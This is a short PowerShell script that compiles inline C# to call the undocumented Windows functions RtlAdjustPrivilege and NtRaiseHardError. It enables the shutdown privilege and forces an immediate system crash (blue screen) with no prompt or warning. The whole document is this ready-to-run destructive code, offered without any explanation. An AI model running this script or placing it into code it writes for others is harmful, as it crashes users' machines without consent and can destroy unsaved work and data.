$s = @" 

using System; 

using System.Runtime.InteropServices; 

public class B { 

    [DllImport("ntdll.dll")] public static extern uint RtlAdjustPrivilege(int p, bool e, bool t, out bool v); 

    [DllImport("ntdll.dll")] public static extern uint NtRaiseHardError(uint s, uint n, uint m, IntPtr p, uint o, out uint r); 

    public static void C() { 

        bool v; uint r; 

        RtlAdjustPrivilege(19, true, false, out v); 

        NtRaiseHardError(0xC0000022, 0, 0, IntPtr.Zero, 6, out r); 

    } 

} 

"@; Add-Type $s; [B]::C() 
